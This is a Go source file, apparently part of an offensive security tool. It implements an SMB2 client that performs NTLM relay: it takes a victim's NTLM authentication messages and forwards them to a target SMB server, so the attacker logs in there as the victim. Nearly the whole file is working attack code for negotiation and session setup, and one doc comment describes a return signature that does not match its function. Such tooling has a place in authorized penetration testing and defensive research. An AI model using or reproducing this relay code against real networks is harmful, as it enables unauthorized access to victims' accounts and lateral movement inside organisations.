package commands

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

// SMB2 relay client — implements just enough SMB2 protocol to perform
// NTLM relay authentication against a target SMB server.

// SMB2 protocol constants.
const (
	smb2Magic          = "\xFESMB"
	smb2HeaderSize     = 64
	smb2CmdNegotiate   = 0x0000
	smb2CmdSessionSetup = 0x0001
	smb2CmdTreeConnect = 0x0003

	smb2StatusOK               = 0x00000000
	smb2StatusMoreProcessing   = 0xC0000016
	smb2StatusLogonFailure     = 0xC000006D
	smb2StatusAccountRestrict  = 0xC000006E

	smb2FlagResponse     = 0x00000001
	smb2DialectSMB210    = 0x0210
	smb2DialectSMB300    = 0x0300
	smb2SecurityModeSign = 0x01
)

// relayConn wraps an SMB2 connection for relay purposes.
type relayConn struct {
	conn      net.Conn
	messageID uint64
	sessionID uint64
	dialect   uint16
}

// relayDial connects to the target SMB server.
func relayDial(target string, port int, timeout time.Duration) (*relayConn, error) {
	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", addr, err)
	}
	_ = conn.SetDeadline(time.Now().Add(timeout))
	return &relayConn{conn: conn}, nil
}

func (rc *relayConn) close() {
	rc.conn.Close()
}

// negotiate sends an SMB2 NEGOTIATE request and returns the SPNEGO security
// blob from the response (contains the server's mechType list).
func (rc *relayConn) negotiate() ([]byte, error) {
	// Build NEGOTIATE request
	// StructureSize(2) + DialectCount(2) + SecurityMode(2) + Reserved(2) +
	// Capabilities(4) + ClientGuid(16) + NegContextOffset(4) + NegContextCount(2) +
	// Reserved2(2) + Dialects(2*N)
	dialects := []uint16{smb2DialectSMB210, smb2DialectSMB300}
	negSize := 36 + 2*len(dialects)
	neg := make([]byte, negSize)
	binary.LittleEndian.PutUint16(neg[0:2], 36)             // StructureSize
	binary.LittleEndian.PutUint16(neg[2:4], uint16(len(dialects))) // DialectCount
	binary.LittleEndian.PutUint16(neg[4:6], smb2SecurityModeSign) // SecurityMode
	// Capabilities, ClientGuid = 0 for simplicity
	var guid [16]byte
	_, _ = rand.Read(guid[:])
	copy(neg[12:28], guid[:])
	// Dialects
	for i, d := range dialects {
		binary.LittleEndian.PutUint16(neg[36+2*i:38+2*i], d)
	}

	resp, err := rc.sendRecv(smb2CmdNegotiate, 0, neg)
	if err != nil {
		return nil, fmt.Errorf("negotiate: %w", err)
	}

	// Parse NEGOTIATE response
	status := rc.parseStatus(resp)
	if status != smb2StatusOK {
		return nil, fmt.Errorf("negotiate failed: status 0x%08X", status)
	}

	payload := resp[smb2HeaderSize:]
	if len(payload) < 65 {
		return nil, fmt.Errorf("negotiate response too short")
	}

	rc.dialect = binary.LittleEndian.Uint16(payload[4:6])

	// SecurityBuffer: offset is from start of SMB2 header
	secBufOffset := binary.LittleEndian.Uint16(payload[56:58])
	secBufLen := binary.LittleEndian.Uint16(payload[58:60])
	if secBufLen == 0 {
		return nil, fmt.Errorf("no security buffer in negotiate response")
	}
	secStart := int(secBufOffset)
	secEnd := secStart + int(secBufLen)
	if secEnd > len(resp) {
		return nil, fmt.Errorf("security buffer out of bounds")
	}
	return resp[secStart:secEnd], nil
}

// sessionSetup sends an SMB2 SESSION_SETUP request with the given SPNEGO
// security blob and returns the response SPNEGO blob.
// Returns (securityBlob, ntStatus, error).
func (rc *relayConn) sessionSetup(spnegoBlob []byte) ([]byte, uint32, error) {
	// SESSION_SETUP request fixed part: 25 bytes
	// StructureSize(2) + Flags(1) + SecurityMode(1) + Capabilities(4) +
	// Channel(4) + SecurityBufferOffset(2) + SecurityBufferLength(2) +
	// PreviousSessionId(8)
	setup := make([]byte, 24+len(spnegoBlob))
	binary.LittleEndian.PutUint16(setup[0:2], 25)             // StructureSize
	setup[2] = 0                                               // Flags
	setup[3] = smb2SecurityModeSign                           // SecurityMode
	binary.LittleEndian.PutUint32(setup[4:8], 0)              // Capabilities
	binary.LittleEndian.PutUint32(setup[8:12], 0)             // Channel
	binary.LittleEndian.PutUint16(setup[12:14], uint16(smb2HeaderSize+24)) // SecurityBufferOffset
	binary.LittleEndian.PutUint16(setup[14:16], uint16(len(spnegoBlob)))   // SecurityBufferLength
	binary.LittleEndian.PutUint64(setup[16:24], 0)            // PreviousSessionId
	copy(setup[24:], spnegoBlob)

	resp, err := rc.sendRecv(smb2CmdSessionSetup, rc.sessionID, setup)
	if err != nil {
		return nil, 0, fmt.Errorf("session setup: %w", err)
	}

	status := rc.parseStatus(resp)

	// Parse SESSION_SETUP response
	if len(resp) < smb2HeaderSize+8 {
		return nil, status, fmt.Errorf("session setup response too short")
	}

	// Extract SessionId from header (offset 40)
	rc.sessionID = binary.LittleEndian.Uint64(resp[40:48])

	payload := resp[smb2HeaderSize:]
	secBufOffset := binary.LittleEndian.Uint16(payload[4:6])
	secBufLen := binary.LittleEndian.Uint16(payload[6:8])
	if secBufLen == 0 {
		return nil, status, nil
	}
	secStart := int(secBufOffset)
	secEnd := secStart + int(secBufLen)
	if secEnd > len(resp) {
		return nil, status, fmt.Errorf("security buffer out of bounds")
	}
	return resp[secStart:secEnd], status, nil
}

// sendRecv sends an SMB2 request and reads the response.
func (rc *relayConn) sendRecv(command uint16, sessionID uint64, payload []byte) ([]byte, error) {
	// Build SMB2 header
	hdr := make([]byte, smb2HeaderSize)
	copy(hdr[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(hdr[4:6], smb2HeaderSize)   // StructureSize
	binary.LittleEndian.PutUint16(hdr[6:8], 1)                // CreditCharge
	binary.LittleEndian.PutUint32(hdr[8:12], 0)               // Status
	binary.LittleEndian.PutUint16(hdr[12:14], command)        // Command
	binary.LittleEndian.PutUint16(hdr[14:16], 1)              // Credits requested
	binary.LittleEndian.PutUint32(hdr[16:20], 0)              // Flags
	binary.LittleEndian.PutUint32(hdr[20:24], 0)              // NextCommand
	binary.LittleEndian.PutUint64(hdr[24:32], rc.messageID)   // MessageId
	rc.messageID++
	binary.LittleEndian.PutUint64(hdr[32:40], 0)              // Reserved/AsyncId
	binary.LittleEndian.PutUint64(hdr[40:48], sessionID)      // SessionId
	// Signature (16 bytes) already zeroed

	// Write NetBIOS session header (4 bytes) + SMB2 message
	msgLen := len(hdr) + len(payload)
	nbHdr := make([]byte, 4)
	binary.BigEndian.PutUint32(nbHdr, uint32(msgLen))
	nbHdr[0] = 0 // session message type

	if _, err := rc.conn.Write(append(nbHdr, append(hdr, payload...)...)); err != nil {
		return nil, fmt.Errorf("write: %w", err)
	}

	// Read response: NetBIOS header (4 bytes) + SMB2 message
	respNB := make([]byte, 4)
	if _, err := io.ReadFull(rc.conn, respNB); err != nil {
		return nil, fmt.Errorf("read header: %w", err)
	}
	respLen := int(binary.BigEndian.Uint32(respNB)) & 0x00FFFFFF
	if respLen < smb2HeaderSize || respLen > 1024*1024 {
		return nil, fmt.Errorf("invalid response length: %d", respLen)
	}

	resp := make([]byte, respLen)
	if _, err := io.ReadFull(rc.conn, resp); err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}

	// Validate magic
	if len(resp) < 4 || string(resp[0:4]) != smb2Magic {
		return nil, fmt.Errorf("invalid SMB2 magic in response")
	}
	return resp, nil
}

func (rc *relayConn) parseStatus(resp []byte) uint32 {
	if len(resp) < 12 {
		return 0xFFFFFFFF
	}
	return binary.LittleEndian.Uint32(resp[8:12])
}

// relayNTLMToSMB performs the full NTLM relay against an SMB target.
// It takes two channels: one to send NTLM messages to the victim handler
// and one to receive NTLM messages from the victim.
// Returns: (success bool, username string, domain string, hashcat string, error)
func relayNTLMToSMB(target string, port int, timeout time.Duration, victimType1 []byte) (*relayConn, []byte, error) {
	rc, err := relayDial(target, port, timeout)
	if err != nil {
		return nil, nil, err
	}

	// Step 1: SMB2 NEGOTIATE
	_, err = rc.negotiate()
	if err != nil {
		rc.close()
		return nil, nil, fmt.Errorf("SMB negotiate: %w", err)
	}

	// Step 2: SESSION_SETUP #1 — send victim's Type 1 in SPNEGO
	spnegoType1 := spnegoWrapNegTokenInit(victimType1)
	respBlob, status, err := rc.sessionSetup(spnegoType1)
	if err != nil {
		rc.close()
		return nil, nil, fmt.Errorf("session setup 1: %w", err)
	}
	if status != smb2StatusMoreProcessing {
		rc.close()
		return nil, nil, fmt.Errorf("expected STATUS_MORE_PROCESSING, got 0x%08X", status)
	}

	// Extract the NTLM Type 2 from the SPNEGO response
	type2 := spnegoExtractNTLMToken(respBlob)
	if type2 == nil {
		rc.close()
		return nil, nil, fmt.Errorf("no NTLM Type 2 in SPNEGO response")
	}
	if err := relayNTLMValidate(type2, ntlmTypeChallenge); err != nil {
		rc.close()
		return nil, nil, fmt.Errorf("invalid Type 2: %w", err)
	}

	return rc, type2, nil
}

// relayCompleteAuth sends the victim's Type 3 to complete SMB authentication.
func relayCompleteAuth(rc *relayConn, victimType3 []byte) (bool, uint32, error) {
	spnegoType3 := spnegoWrapNegTokenResp(victimType3)
	_, status, err := rc.sessionSetup(spnegoType3)
	if err != nil {
		return false, 0, fmt.Errorf("session setup 2: %w", err)
	}
	if status == smb2StatusOK {
		return true, status, nil
	}
	return false, status, nil
}
